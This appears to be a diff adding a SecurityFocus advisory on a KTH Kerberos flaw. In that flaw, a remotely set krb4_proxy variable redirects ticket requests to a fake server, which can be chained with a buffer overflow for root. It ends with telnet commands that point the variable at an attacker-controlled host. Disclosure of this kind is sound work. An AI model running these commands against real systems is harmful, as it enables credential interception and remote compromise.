@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/2090/info
+
+Kerberos is a widely used network service authentication system. The version of Kerberos developed and maintained by KTH (Swedish Royal Institute of Technology) contains a vulnerability that may allow/assist in a local or remote root compromise.
+
+KTH Kerberos uses an environment variable called 'krb4_proxy' when a proxy server is required to retrieve tickets via HTTP. KTH Kerberos-supported services will contact the supplied proxy server (the value of krb4_proxy) instead of the default Kerberos server if this variable is set.
+
+It is possible for malicious remote users (before authenticating) to remotely set the value of this variable and have the server program contact a fake Kerberos server. This would allow the attacker to intercept authentication requests and/or send false replies to the service they are attempting to use. An attacker, for example, could send the environment variable via telnet to a Kerberos supporting telnet daemon.
+
+This attack allows malicious users in control of a fake Kerberos server to exploit a buffer overflow vulnerability (See Bugtraq ID 2091) in the Kerberos shared libraries with malformed replies. If exploited, the combined vulnerabilities may provide remote root access to attackers. 
+
+telnet> environ define krb4_proxy http://your.host:80
+telnet> environ export krb4_proxy
+telnet> open localhost 
